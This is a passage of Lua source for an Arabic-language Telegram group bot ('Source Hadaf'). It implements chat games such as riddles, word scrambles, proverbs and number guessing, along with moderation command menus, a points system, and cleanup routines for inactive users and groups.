name = string.gsub(name,"اخطبوط","ط ب و ا خ ط")
name = string.gsub(name,"سلمون","ن م و ل س")
name = string.gsub(name,"فرنسا","ن ف ر س ا")
name = string.gsub(name,"برتقاله","ر ت ق ب ا ه ل")
name = string.gsub(name,"تفاح","ح ف ا ت")
name = string.gsub(name,"مطرقه","ه ط م ر ق")
name = string.gsub(name,"شباك","ب ش ا ك")
name = string.gsub(name,"باص","ص ا ب")
name = string.gsub(name,"سمكه","ك س م ه")
name = string.gsub(name,"ذباب","ب ا ب ذ")
name = string.gsub(name,"تلفاز","ت ف ل ز ا")
name = string.gsub(name,"حاسوب","س ا ح و ب")
name = string.gsub(name,"انترنت","ا ت ن ر ن ت")
name = string.gsub(name,"ساحه","ح ا ه س")
name = string.gsub(name,"جسر","ر ج س")
send(msg.chat_id_, msg.id_,"🔰┇اسرع واحد يرتبها ~ {"..name.."}")
return false
end
elseif text == "حزوره" then
if redis:get(bot_id.."Hadaf:Lock:Game:Group"..msg.chat_id_) then
redis:del(bot_id.."Hadaf:Set:Hzora"..msg.chat_id_)
Hzora = {"الجرس","عقرب الساعه","السمك","المطر","5","الكتاب","المسمار","7","الكعبه","بيت الشعر","انا","امي","الابره","الساعه","22","غلط","كم الساعه","البيض","المرايه","الضوء","الهواء","الظل","العمر","القلم","المشط","الحفره","البحر","الثلج","الاسفنج","الصوت","سفينه"};
name = Hzora[math.random(#Hzora)]
redis:set(bot_id.."Hadaf:Klam:Hzor"..msg.chat_id_,name)
name = string.gsub(name,"الجرس","شيء اذا لمسته صرخ ما هو ؟")
name = string.gsub(name,"عقرب الساعه","اخوان لا يستطيعان تمضيه اكثر من دقيقه معا فمن هما ؟")
name = string.gsub(name,"السمك","ما هو الحيوان الذي لم يصعد الى سفينة نوح عليه السلام ؟")
name = string.gsub(name,"المطر","شيء يسقط على رأسك من الاعلى ولا يجرحك فما هو ؟")
name = string.gsub(name,"5","ما العدد الذي اذا ضربته بنفسه واضفت عليه 5 يصبح ثلاثين ")
name = string.gsub(name,"الكتاب","ما الشيء الذي له اوراق وليس له جذور ؟")
name = string.gsub(name,"المسمار","ما هو الشيء الذي لا يمشي الا بالضرب ؟")
name = string.gsub(name,"7","عائله مؤلفه من 6 بنات واخ لكل منهن .فكم عدد افراد العائله ")
name = string.gsub(name,"الكعبه","ما هو الشيء الموجود وسط مكة ؟")
name = string.gsub(name,"بيت الشعر","ما هو البيت الذي ليس فيه ابواب ولا نوافذ ؟ ")
name = string.gsub(name,"انا","ابن امك وابن ابيك وليس باختك ولا باخيك فمن يكون ؟")
name = string.gsub(name,"امي","اخت خالك وليست خالتك من تكون ؟ ")
name = string.gsub(name,"الابره","ما هو الشيء الذي كلما خطا خطوه فقد شيئا من ذيله ؟ ")
name = string.gsub(name,"الساعه","ما هو الشيء الذي يقول الصدق ولكنه اذا جاع كذب ؟")
name = string.gsub(name,"22","كم مره ينطبق عقربا الساعه على بعضهما في اليوم الواحد ")
name = string.gsub(name,"غلط","ما هي الكلمه الوحيده التي تلفض غلط دائما ؟ ")
name = string.gsub(name,"كم الساعه","ما هو السؤال الذي تختلف اجابته دائما ؟")
name = string.gsub(name,"البيض","ماهو الشيء الذي اسمه على لونه ؟")
name = string.gsub(name,"المرايه","ارى كل شيء من دون عيون من اكون ؟ ")
name = string.gsub(name,"الضوء","ما هو الشيء الذي يخترق الزجاج ولا يكسره ؟")
name = string.gsub(name,"الهواء","ما هو الشيء الذي يسير امامك ولا تراه ؟")
name = string.gsub(name,"الظل","ما هو الشيء الذي يلاحقك اينما تذهب ؟ ")
name = string.gsub(name,"العمر","ما هو الشيء الذي كلما طال قصر ؟ ")
name = string.gsub(name,"القلم","ما هو الشيء الذي يكتب ولا يقرأ ؟")
name = string.gsub(name,"المشط","له أسنان ولا يعض ما هو ؟ ")
name = string.gsub(name,"الحفره","ما هو الشيء اذا أخذنا منه ازداد وكبر ؟")
name = string.gsub(name,"البحر","ما هو الشيء الذي يرفع اثقال ولا يقدر يرفع مسمار ؟")
name = string.gsub(name,"الثلج","انا ابن الماء فان تركوني في الماء مت فمن انا ؟")
name = string.gsub(name,"الاسفنج","كلي ثقوب ومع ذلك احفظ الماء فمن اكون ؟")
name = string.gsub(name,"الصوت","اسير بلا رجلين ولا ادخل الا بالاذنين فمن انا ؟")
name = string.gsub(name,"سفينه","حامل ومحمول نصف ناشف ونصف مبلول فمن اكون ؟ ")
send(msg.chat_id_, msg.id_,"🔰┇اسرع واحد يحل الحزوره ↓\n {"..name.."}")
return false
end
elseif text == "معاني" then
if redis:get(bot_id.."Hadaf:Lock:Game:Group"..msg.chat_id_) then
redis:del(bot_id.."Hadaf:Set:Maany"..msg.chat_id_)
Maany_Rand = {"قرد","دجاجه","بطريق","ضفدع","بومه","نحله","ديك","جمل","بقره","دولفين","تمساح","قرش","نمر","اخطبوط","سمكه","خفاش","اسد","فأر","ذئب","فراشه","عقرب","زرافه","قنفذ","تفاحه","باذنجان"}
name = Maany_Rand[math.random(#Maany_Rand)]
redis:set(bot_id.."Hadaf:Maany"..msg.chat_id_,name)
name = string.gsub(name,"قرد","🐒")
name = string.gsub(name,"دجاجه","🐔")
name = string.gsub(name,"بطريق","🐧")
name = string.gsub(name,"ضفدع","🐸")
name = string.gsub(name,"بومه","🦉")
name = string.gsub(name,"نحله","🐝")
name = string.gsub(name,"ديك","🐓")
name = string.gsub(name,"جمل","🐫")
name = string.gsub(name,"بقره","🐄")
name = string.gsub(name,"دولفين","🐬")
name = string.gsub(name,"تمساح","🐊")
name = string.gsub(name,"قرش","🦈")
name = string.gsub(name,"نمر","🐅")
name = string.gsub(name,"اخطبوط","🐙")
name = string.gsub(name,"سمكه","🐟")
name = string.gsub(name,"خفاش","🦇")
name = string.gsub(name,"اسد","🦁")
name = string.gsub(name,"فأر","🐭")
name = string.gsub(name,"ذئب","🐺")
name = string.gsub(name,"فراشه","🦋")
name = string.gsub(name,"عقرب","🦂")
name = string.gsub(name,"زرافه","🦒")
name = string.gsub(name,"قنفذ","??")
name = string.gsub(name,"تفاحه","🍎")
name = string.gsub(name,"باذنجان","🍆")
send(msg.chat_id_, msg.id_,"🔰┇اسرع واحد يرسل معنى السمايل ~ {"..name.."}")
return false
end
elseif text == "العكس" then
if redis:get(bot_id.."Hadaf:Lock:Game:Group"..msg.chat_id_) then
redis:del(bot_id.."Hadaf:Set:Aks"..msg.chat_id_)
katu = {"بارد","فهمت","زين","اسمعك","اسود","جميل","نظيف","حاره","عالي","جوا","سريع","سعادة","طويل","سمين","ضعيف","كبير","شجاع","عدل","حي","نشيط","شبعان","موعطشان","ولد","انا","هادئ"}
name = katu[math.random(#katu)]
redis:set(bot_id.."Hadaf:Set:Aks:Game"..msg.chat_id_,name)
name = string.gsub(name,"بارد","حار")
name = string.gsub(name,"فهمت","مافهمت")
name = string.gsub(name,"زين","مو زين")
name = string.gsub(name,"اسمعك","ماسمعك")
name = string.gsub(name,"اسود","ابيض")
name = string.gsub(name,"جميل","قبيح")
name = string.gsub(name,"نظيف","وصخ")
name = string.gsub(name,"حاره","بارده")
name = string.gsub(name,"عالي","واطي")
name = string.gsub(name,"جوا","برا")
name = string.gsub(name,"سريع","بطيء")
name = string.gsub(name,"سعادة","حزن")
name = string.gsub(name,"طويل","قصير")
name = string.gsub(name,"سمين","نحيف")
name = string.gsub(name,"ضعيف","قوي")
name = string.gsub(name,"كبير","صغير")
name = string.gsub(name,"شجاع","جبان")
name = string.gsub(name,"عدل","ظلم")
name = string.gsub(name,"حي","ميت")
name = string.gsub(name,"نشيط","كسول")
name = string.gsub(name,"شبعان","جوعان")
name = string.gsub(name,"موعطشان","عطشان")
name = string.gsub(name,"ولد","بنت")
name = string.gsub(name,"انا","انت")
name = string.gsub(name,"هادئ","عصبي")
send(msg.chat_id_, msg.id_,"🔰┇اسرع واحد يرسل العكس ~ {"..name.."}")
return false
end
elseif text == "خمن" or text == "تخمين" then   
if redis:get(bot_id.."Hadaf:Lock:Game:Group"..msg.chat_id_) then
Num = math.random(1,20)
redis:set(bot_id.."Hadaf:GAMES:NUM"..msg.chat_id_,Num) 
send(msg.chat_id_, msg.id_,"\n📛┇اهلا بك عزيزي في لعبة التخمين :\nٴ━━━━━━━━━━\n".."💢┇ملاحظه لديك { 3 } محاولات فقط فكر قبل ارسال تخمينك \n\n".."🔖┇سيتم تخمين عدد ما بين ال {1 و 20} اذا تعتقد انك تستطيع الفوز جرب واللعب الان ؟ ")
redis:setex(bot_id.."Hadaf:GAME:TKMEN" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 100, true)  
return false  
end
elseif text == "محيبس" or text == "بات" then
if redis:get(bot_id.."Hadaf:Lock:Game:Group"..msg.chat_id_) then   
Num = math.random(1,6)
redis:set(bot_id.."Hadaf:Games:Bat"..msg.chat_id_,Num) 
send(msg.chat_id_, msg.id_,[[
*➀       ➁     ➂      ➃      ➄     ➅
↓      ↓     ↓      ↓     ↓     ↓
👊 ‹› 👊 ‹› 👊 ‹› 👊 ‹› 👊 ‹› 👊
📮┇اختر لأستخراج المحيبس الايد التي تحمل المحيبس 
🎁┇الفائز يحصل على { 3 } من النقاط *
]])
redis:setex(bot_id.."Hadaf:SET:GAME" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 100, true)  
return false  
end
elseif text == "المختلف" then
if redis:get(bot_id.."Hadaf:Lock:Game:Group"..msg.chat_id_) then
mktlf = {"😸","☠","🐼","🐇","🌑","🌚","⭐️","✨","⛈","🌥","⛄️","👨‍🔬","👨‍💻","👨‍🔧","🧚‍♀","🧜‍♂","🧝‍♂","🙍‍♂","🧖‍♂","👬","🕒","🕤","⌛️","📅",};
name = mktlf[math.random(#mktlf)]
redis:del(bot_id.."Hadaf:Set:Moktlf:Bot"..msg.chat_id_)
redis:set(bot_id.."Hadaf::Set:Moktlf"..msg.chat_id_,name)
name = string.gsub(name,"😸","😹😹😹😹😹😹😹😹😸😹😹😹😹")
name = string.gsub(name,"☠","💀💀💀💀💀💀💀☠💀💀💀💀💀")
name = string.gsub(name,"🐼","👻👻👻🐼👻👻👻👻👻👻👻")
name = string.gsub(name,"🐇","🕊🕊🕊🕊🕊🐇🕊🕊🕊🕊")
name = string.gsub(name,"🌑","🌚🌚🌚🌚🌚🌑🌚🌚🌚")
name = string.gsub(name,"🌚","🌑🌑🌑🌑🌑🌚🌑🌑🌑")
name = string.gsub(name,"⭐️","🌟🌟🌟🌟🌟🌟🌟🌟⭐️🌟🌟🌟")
name = string.gsub(name,"✨","💫💫💫💫💫✨💫💫💫💫")
name = string.gsub(name,"⛈","🌨🌨🌨🌨🌨⛈🌨🌨🌨🌨")
name = string.gsub(name,"🌥","⛅️⛅️⛅️⛅️⛅️⛅️🌥⛅️⛅️⛅️⛅️")
name = string.gsub(name,"⛄️","☃☃☃☃☃☃⛄️☃☃☃☃")
name = string.gsub(name,"👨‍🔬","👩‍🔬👩‍🔬👩‍🔬👩‍🔬👩‍🔬👩‍🔬👩‍🔬👩‍🔬👨‍🔬👩‍🔬👩‍🔬👩‍🔬")
name = string.gsub(name,"👨‍💻","👩‍💻👩‍💻👩‍‍💻👩‍‍💻👩‍💻👨‍💻👩‍💻👩‍💻👩‍💻")
name = string.gsub(name,"👨‍🔧","👩‍🔧👩‍🔧👩‍🔧👩‍🔧👩‍🔧👩‍🔧👨‍🔧👩‍🔧")
name = string.gsub(name,"👩‍🍳","👨‍🍳👨‍🍳👨‍🍳👨‍🍳👨‍🍳👩‍🍳👨‍🍳👨‍🍳👨‍🍳")
name = string.gsub(name,"🧚‍♀","🧚‍♂🧚‍♂🧚‍♂🧚‍♂🧚‍♀🧚‍♂🧚‍♂")
name = string.gsub(name,"🧜‍♂","🧜‍♀🧜‍♀🧜‍♀🧜‍♀🧜‍♀🧚‍♂🧜‍♀🧜‍♀🧜‍♀")
name = string.gsub(name,"🧝‍♂","🧝‍♀🧝‍♀🧝‍♀🧝‍♀🧝‍♀🧝‍♂🧝‍♀🧝‍♀🧝‍♀")
name = string.gsub(name,"🙍‍♂️","🙎‍♂️🙎‍♂️🙎‍♂️🙎‍♂️🙎‍♂️🙍‍♂️🙎‍♂️🙎‍♂️🙎‍♂️")
name = string.gsub(name,"🧖‍♂️","🧖‍♀️🧖‍♀️🧖‍♀️🧖‍♀️🧖‍♀️🧖‍♂️🧖‍♀️🧖‍♀️🧖‍♀️🧖‍♀️")
name = string.gsub(name,"👬","👭👭👭👭👭👬👭👭👭")
name = string.gsub(name,"👨‍👨‍👧","👨‍👨‍👦👨‍👨‍👦👨‍👨‍👦👨‍👨‍👦👨‍👨‍👧👨‍👨‍👦👨‍👨‍👦")
name = string.gsub(name,"🕒","🕒🕒🕒🕒🕒🕒🕓🕒🕒🕒")
name = string.gsub(name,"🕤","🕥🕥🕥🕥🕥🕤🕥🕥🕥")
name = string.gsub(name,"⌛️","⏳⏳⏳⏳⏳⏳⌛️⏳⏳")
name = string.gsub(name,"📅","📆📆📆📆📆📆📅📆📆")
send(msg.chat_id_, msg.id_,"🔰┇اسرع واحد يرسل المختلف ~ {"..name.."}")
return false
end
elseif text == "امثله" then
if redis:get(bot_id.."Hadaf:Lock:Game:Group"..msg.chat_id_) then
mthal = {"جوز","ضراطه","الحبل","الحافي","شقره","بيدك","سلايه","النخله","الخيل","حداد","المبلل","يركص","قرد","العنب","العمه","الخبز","بالحصاد","شهر","شكه","يكحله",};
name = mthal[math.random(#mthal)]
redis:set(bot_id.."Hadaf:Set:Amth"..msg.chat_id_,name)
redis:del(bot_id.."Hadaf:Set:Amth:Bot"..msg.chat_id_)
name = string.gsub(name,"جوز","ينطي____للماعده سنون")
name = string.gsub(name,"ضراطه","الي يسوق المطي يتحمل___")
name = string.gsub(name,"بيدك","اكل___محد يفيدك")
name = string.gsub(name,"الحافي","تجدي من___نعال")
name = string.gsub(name,"شقره","مع الخيل يا___")
name = string.gsub(name,"النخله","الطول طول___والعقل عقل الصخلة")
name = string.gsub(name,"سلايه","بالوجه امراية وبالظهر___")
name = string.gsub(name,"الخيل","من قلة___شدو على الچلاب سروج")
name = string.gsub(name,"حداد","موكل من صخم وجهه كال آني___")
name = string.gsub(name,"المبلل","___ما يخاف من المطر")
name = string.gsub(name,"الحبل","اللي تلدغة الحية يخاف من جرة___")
name = string.gsub(name,"يركص","المايعرف___يكول الكاع عوجه")
name = string.gsub(name,"العنب","المايلوح___يكول حامض")
name = string.gsub(name,"العمه","___إذا حبت الچنة ابليس يدخل الجنة")
name = string.gsub(name,"الخبز","انطي___للخباز حتى لو ياكل نصه")
name = string.gsub(name,"باحصاد","اسمة___ومنجله مكسور")
name = string.gsub(name,"شهر","امشي__ولا تعبر نهر")
name = string.gsub(name,"شكه","يامن تعب يامن__يا من على الحاضر لكة")
name = string.gsub(name,"القرد","__بعين امه غزال")
name = string.gsub(name,"يكحله","اجه___عماها")
send(msg.chat_id_, msg.id_,"🔰┇اسرع واحد يكمل المثل ~ {"..name.."}")
return false
end
elseif text == 'السورس' or text == 'سورس' or text == 'ياسورس'  then
send(msg.chat_id_, msg.id_,[[
💢┇Source Hadaf
💢┇By: @i3mrz
━━━━━━━━━━━━━
]]) 
elseif text == 'الاوامر' and Admin(msg) then
send(msg.chat_id_, msg.id_,[[*
💢┇توجد ← 5 اوامر في البوت
━━━━━━━━━━━━━
📮┇ارسل { م1 } ← اوامر الحمايه
⚜┇ارسل { م2 } ← اوامر الادمنيه
💠┇ارسل { م3 } ← اوامر المدراء
🌀┇ارسل { م4 } ← اوامر المنشئين
🗯┇ارسل { م5 } ← اوامر مطورين البوت
━━━━━━━━━━━━━
⚡┇مطور البوت ←* @i3mrz
]]) 
elseif text == 'م1' and Admin(msg) then
send(msg.chat_id_, msg.id_,[[*
💢┇اوامر الحمايه اتبع مايلي ...
━━━━━━━━━━━━━
✅┇قفل ، فتح ← الامر 
✅┇تستطيع قفل حمايه كما يلي ...
📛┇← { بالتقييد ، بالطرد ، بالكتم }
📛┇مثال : قفل الروابط بالكتم
━━━━━━━━━━━━━
⚡┇الروابط
⚡┇المعرف
⚡┇النداء
⚡┇الشارحه
⚡┇التعديل
⚡┇التثبيت
⚡┇المتحركه
⚡┇الملفات
⚡┇الصور
━━━━━━━━━━━━━
⚠️️┇الماركداون
⚠️️┇البوتات
⚠️️┇التكرار
⚠️️┇الكلايش
⚠️️┇السيلفي
⚠️️┇الملصقات
⚠️️┇الفيديو
⚠️️┇الانلاين
⚠️️┇المحادثه
━━━━━━━━━━━━━
💢┇التوجيه
💢┇المقاطع الصوتية
💢┇الصوت
💢┇الجهات
💢┇الاشعارات
━━━━━━━━━━━━━
⚡┇مطور البوت ←* @i3mrz
]]) 
elseif text == 'م2' and Admin(msg) then
send(msg.chat_id_, msg.id_,[[*
💢┇اوامر ادمنية المجموعه ...
━━━━━━━━━━━━━
🔗┇رفع، تنزيل ← مميز
🔗┇نداء للكل ، عدد القروب
🔗┇كتم ، حظر ، طرد ، تقييد
🔗┇الغاء الكتم ، الغاء الحظر ، الغاء التقييد
🔗┇منع ، الغاء منع 
━━━━━━━━━━━━━
📑┇عرض القوائم كما يلي ...
━━━━━━━━━━━━━
⛔┇المطورين
⛔┇المنشئين الاساسيين
⛔┇المنشئين
⛔┇المدراء
⛔┇الادمنيه
⛔┇المحظورين
⛔┇المكتومين
⛔┇المميزين 
⛔┇قائمه المنع
⛔┇الصلاحيات
⛔┇الردود
⛔┇ردود العام
⛔┇الاوامر المضافه
━━━━━━━━━━━━━
📌┇تثبيت ، الغاء تثبيت
📌┇الرابط ، الاعدادات
📌┇الترحيب ، القوانين
📌┇تفعيل ، تعطيل ← الترحيب
📌┇تفعيل ، تعطيل ← الرابط
📌┇تفعيل ، تعطيل ← الرابط
📌┇اضف صلاحيه ، مسح صلاحيه 
📌┇جهاتي ،ايدي ، رسائلي
📌┇تعديلاتي ، نقاطي
📌┇كشف البوتات
━━━━━━━━━━━━━
🆕┇وضع ، ضع ← الاوامر التاليه 
🚸┇اسم ، رابط ، صوره
🚸┇قوانين ، وصف ، ترحيب
━━━━━━━━━━━━━
🗑┇حذف ، مسح ← الاوامر التاليه
💥┇قائمه المنع ، المحظورين 
??┇المميزين ، المكتومين ، القوانين
💥┇المطرودين ، البوتات ، الصوره
💥┇الصلاحيات ، الرابط
━━━━━━━━━━━━━
⚡┇مطور البوت ←* @i3mrz
]]) 
elseif text == 'م3' and Owner(msg) then
send(msg.chat_id_, msg.id_,[[*
💢┇اوامر المدراء في المجموعه
━━━━━━━━━━━━━
💠┇رفع ، تنزيل ← ادمن
📑┇الادمنيه 
〽️┇رفع، كشف ← القيود
⚜┇تنزيل الكل ← { بالرد ، بالمعرف }
━━━━━━━━━━━━━
📛┇لتغيير رد الرتب في البوت
━━━━━━━━━━━━━
♻️┇تغيير رد ← {اسم الرتبه والنص} 
💠┇المطور ، المنشئ الاساسي
💠┇المنشئ ، المدير ، الادمن
💠┇المميز ، العضو
━━━━━━━━━━━━━
💭┇تفعيل ، تعطيل ← الاوامر التاليه ↓
━━━━━━━━━━━━━
♦️┇الايدي ، الايدي بالصوره
♦️┇ردود العام ، الردود
♦️┇اطردني ، الالعاب ، الرفع
♦️┇الحظر ، الرابط
━━━━━━━━━━━━━
🎐┇تعيين ، مسح ←{ الايدي }
🎐┇رفع الادمنيه ، مسح الادمنيه
🎐┇الردود ، مسح الردود
🎐┇اضف ، حذف ← { رد }
🎐┇تنظيف ← { عدد }
━━━━━━━━━━━━━
⚡┇مطور البوت ←* @i3mrz
]]) 
elseif text == 'م4' and Constructor(msg) then
send(msg.chat_id_, msg.id_,[[*
💢┇اوامر المنشئ الاساسي
━━━━━━━━━━━━━
⚜┇رفع ، تنزيل ←{ منشئ }
⚜┇المنشئين ، مسح المنشئين
━━━━━━━━━━━━━
🏅┇اوامر المنشئ المجموعه
━━━━━━━━━━━━━
💠┇رفع ، تنزيل ← { مدير }
💠┇المدراء ، مسح المدراء
💠┇اضف رسائل ← { بالرد او الايدي }
💠┇اضف نقاط ← { بالرد او الايدي }
💠┇اضف ، حذف ← { امر }
💠┇الاوامر المضافه ، مسح الاوامر المضافه
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
⚡┇مطور البوت ←* @i3mrz
]]) 
elseif text == 'م5' and DeveloperBot(msg)  then
send(msg.chat_id_, msg.id_,[[*
💢┇اوامر المطور الاساسي  
━━━━━━━━━━━━━
💭┇حظر عام ، الغاء العام
💭┇اضف ، حذف ← { مطور } 
💭┇قائمه العام ، مسح قائمه العام
💭┇المطورين ، مسح المطورين
━━━━━━━━━━━━━
📪┇اضف ، حذف ← { رد عام }
📪┇وضع ، حذف ← { كليشه المطور } 
📪┇مسح ردود العام ، ردود العام 
📪┇تحديث ،  تحديث السورس 
📪┇تعيين عدد الاعضاء ← { العدد }
━━━━━━━━━━━━━
💠┇تفعيل ، تعطيل ← { الاوامر التاليه ↓}
🌀┇البوت الخدمي ، المغادرة ، الاذاعه
🌀┇ملف ← { اسم الملف }
━━━━━━━━━━━━━
⚜┇اوامر المطور في البوت
━━━━━━━━━━━━━
📛┇تفعيل ، تعطيل ، الاحصائيات
📛┇رفع، تنزيل ← { منشئ اساسي }
📛┇مسح الاساسين ، المنشئين الاساسين 
📛┇غادر ، غادر ← { والايدي }
📛┇اذاعه ، اذاعه بالتوجيه ، اذاعه بالتثبيت
📛┇اذاعه خاص ، اذاعه خاص بالتوجيه 
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
⚡┇مطور البوت ←* @i3mrz
]]) 
elseif text == 'الالعاب' then
send(msg.chat_id_, msg.id_,[[*
⛔┇قائمه الالعاب البوت
━━━━━━━━━━━━━
🎮┇لعبة المختلف » المختلف
🎮┇لعبة الامثله » امثله
🎮┇لعبة العكس » العكس
🎮┇لعبة الحزوره » حزوره
🎮┇لعبة المعاني » معاني
🎮┇لعبة المحيبس » محيبس
🎮┇لعبة التخمين » خمن
🎮┇لعبه الاسرع » الاسرع
🎮┇لعبة السمايلات » سمايلات
━━━━━━━━━━━━━
💠┇نقاطي ← لعرض عدد الارباح
💬┇بيع نقاطي ← { العدد } ← لبيع كل نقطة مقابل {50} رساله
*]]) 
elseif text == 'رسائلي' then
local nummsg = redis:get(bot_id..'Hadaf:Num:Message:User'..msg.chat_id_..':'..msg.sender_user_id_) or 1
send(msg.chat_id_, msg.id_,'📨┇عدد رسائلك هنا *~ '..nummsg..'*') 
elseif text == '' or text == 'تعديلاتي' then
local edit = redis:get(bot_id..'Hadaf:Num:Message:Edit'..msg.chat_id_..msg.sender_user_id_) or 0
send(msg.chat_id_, msg.id_,'📝┇عدد التعديلات هنا *~ '..edit..'*') 
elseif text == 'جهاتي' then
local addmem = redis:get(bot_id.."Hadaf:Num:Add:Memp"..msg.chat_id_..":"..msg.sender_user_id_) or 0
send(msg.chat_id_, msg.id_,'👥┇عدد جهاتك المضافه هنا *~ '..addmem..'*') 
elseif text == "نقاطي" then 
local Num = redis:get(bot_id.."Hadaf:Num:Add:Games"..msg.chat_id_..msg.sender_user_id_) or 0
if Num == 0 then 
Text = "⚠️┇لم تفز بأي نقطة "
else
Text = "🎁┇عدد النقاط التي ربحتها *← "..Num.." *"
end
send(msg.chat_id_, msg.id_,Text) 
elseif text and text:match("^بيع نقاطي (%d+)$") then
local NUMPY = text:match("^بيع نقاطي (%d+)$") 
if tonumber(NUMPY) == tonumber(0) then
send(msg.chat_id_,msg.id_,"\n*📮┇لا استطيع البيع اقل من 1 *") 
return false 
elseif tonumber(redis:get(bot_id.."Hadaf:Num:Add:Games"..msg.chat_id_..msg.sender_user_id_)) == tonumber(0) then
send(msg.chat_id_,msg.id_,"🔖┇ليس لديك نقاط من الالعاب \n📬┇اذا كنت تريد ربح النقاط \n📌┇ارسل الالعاب وابدأ اللعب ! ") 
else
local NUM_GAMES = redis:get(bot_id.."Hadaf:Num:Add:Games"..msg.chat_id_..msg.sender_user_id_)
if tonumber(NUMPY) > tonumber(NUM_GAMES) then
send(msg.chat_id_,msg.id_,"\n⚠️┇ليس لديك نقاط بهذا العدد \n📬┇لزيادة نقاطك في اللعبه \n📌┇ارسل الالعاب وابدأ اللعب !") 
return false 
end
local NUMNKO = (NUMPY * 50)
redis:decrby(bot_id.."Hadaf:Num:Add:Games"..msg.chat_id_..msg.sender_user_id_,NUMPY)  
redis:incrby(bot_id.."Hadaf:Num:Message:User"..msg.chat_id_..":"..msg.sender_user_id_,NUMNKO)  
send(msg.chat_id_,msg.id_,"✅┇تم خصم *~ { "..NUMPY.." }* من نقاطك \n📨┇وتم اضافة* ~ { "..(NUMPY * 50).." } رساله الى رسالك *")
end 
return false 
elseif text and text:match("^اضف رسائل (%d+)$") and msg.reply_to_message_id_ == 0 and Constructor(msg) then    
taha = text:match("^اضف رسائل (%d+)$")
redis:set(bot_id.."Hadaf:id:user"..msg.chat_id_,taha)  
redis:setex(bot_id.."Hadaf:Add:msg:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 120, true)  
send(msg.chat_id_, msg.id_, "✉┇ارسل لي عدد الرسائل الان") 
return false
elseif text and text:match("^اضف نقاط (%d+)$") and msg.reply_to_message_id_ == 0 and Constructor(msg) then  
taha = text:match("^اضف نقاط (%d+)$")
redis:set(bot_id.."Hadaf:idgem:user"..msg.chat_id_,taha)  
redis:setex(bot_id.."Hadaf:gemadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 120, true)  
send(msg.chat_id_, msg.id_, "💠┇ارسل لي عدد النقاط الان") 
elseif text and text:match("^اضف نقاط (%d+)$") and msg.reply_to_message_id_ ~= 0 and Constructor(msg) then
function reply(extra, result, success)
redis:incrby(bot_id.."Hadaf:Num:Add:Games"..msg.chat_id_..result.sender_user_id_,text:match("^اضف نقاط (%d+)$"))  
send(msg.chat_id_, msg.id_,"📮┇تم اضافه عدد نقاط : "..text:match("^اضف نقاط (%d+)$").." ")  
end
tdcli_function ({ID = "GetMessage",chat_id_=msg.chat_id_,message_id_=tonumber(msg.reply_to_message_id_)},reply, nil)
return false
elseif text and text:match("^اضف رسائل (%d+)$") and msg.reply_to_message_id_ ~= 0 and Constructor(msg) then
function reply(extra, result, success)
redis:del(bot_id.."Hadaf:Msg_User"..msg.chat_id_..":"..result.sender_user_id_) 
redis:incrby(bot_id.."Hadaf:Num:Message:User"..msg.chat_id_..":"..result.sender_user_id_,text:match("^اضف رسائل (%d+)$"))  
send(msg.chat_id_, msg.id_, "📮┇تم اضافه عدد الرسائل : "..text:match("^اضف رسائل (%d+)$").." ")  
end
tdcli_function ({ID = "GetMessage",chat_id_=msg.chat_id_,message_id_=tonumber(msg.reply_to_message_id_)},reply, nil)
return false
elseif text == "تنظيف المشتركين" and Dev_Hadaf(msg) then
local pv = redis:smembers(bot_id..'Hadaf:Num:User:Pv')  
local sendok = 0
for i = 1, #pv do
tdcli_function({ID='GetChat',chat_id_ = pv[i]},function(arg,dataq)
tdcli_function ({ ID = "SendChatAction",chat_id_ = pv[i], action_ = {  ID = "SendMessageTypingAction", progress_ = 100} },function(arg,data) 
if data.ID and data.ID == "Ok"  then
else
redis:srem(bot_id..'Hadaf:Num:User:Pv',pv[i])  
sendok = sendok + 1
end
if #pv == i then 
if sendok == 0 then
send(msg.chat_id_, msg.id_,'👤┇لا يوجد مشتركين وهميين')   
else
local ok = #pv - sendok
send(msg.chat_id_, msg.id_,'*👥┇عدد المشتركين الان ←{ '..#pv..' }\n⚠️┇تم العثور على ←{ '..sendok..' } مشترك قام بحظر البوت\n✅┇اصبح عدد المشتركين الان ←{ '..ok..' } مشترك *')   
end
end
end,nil)
end,nil)
end
return false
elseif text == "تنظيف القروبات" and Dev_Hadaf(msg) then
local group = redis:smembers(bot_id..'Hadaf:ChekBotAdd')  
local w = 0
local q = 0
for i = 1, #group do
tdcli_function({ID='GetChat',chat_id_ = group[i]
},function(arg,data)
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusMember" then
redis:srem(bot_id..'Hadaf:ChekBotAdd',group[i])  
w = w + 1
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusLeft" then
redis:srem(bot_id..'Hadaf:ChekBotAdd',group[i])  
q = q + 1
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusKicked" then
redis:srem(bot_id..'Hadaf:ChekBotAdd',group[i])  
q = q + 1
end
if data and data.code_ and data.code_ == 400 then
redis:srem(bot_id..'Hadaf:ChekBotAdd',group[i])  
w = w + 1
end
if #group == i then 
if (w + q) == 0 then
send(msg.chat_id_, msg.id_,'👥┇لا توجد مجموعات وهميه ')   
else
local taha = (w + q)
local sendok = #group - taha
if q == 0 then
taha = ''
else
taha = '\n🚯┇ تم ازالة ~ '..q..' مجموعات من البوت'
end
if w == 0 then
Hadaf = ''
else
Hadaf = '\n🚯┇ تم ازالة ~'..w..' مجموعه لان البوت عضو'
end
send(msg.chat_id_, msg.id_,'*👥┇ عدد المجموعات الان ← { '..#group..' } مجموعه '..Hadaf..''..taha..'\n🔘┇اصبح عدد المجموعات الان ← { '..sendok..' } مجموعات*\n')   
end
end
end,nil)
end
elseif text == "اطردني" or text == "طردني" then
if not redis:get(bot_id.."Hadaf:Cheking:Kick:Me:Group"..msg.chat_id_) then
if Rank_Checking(msg.sender_user_id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, "\n⚠️┇ عذرًا لا استطيع طرد ( "..Get_Rank(msg.sender_user_id_,msg.chat_id_).." )")
return false
end
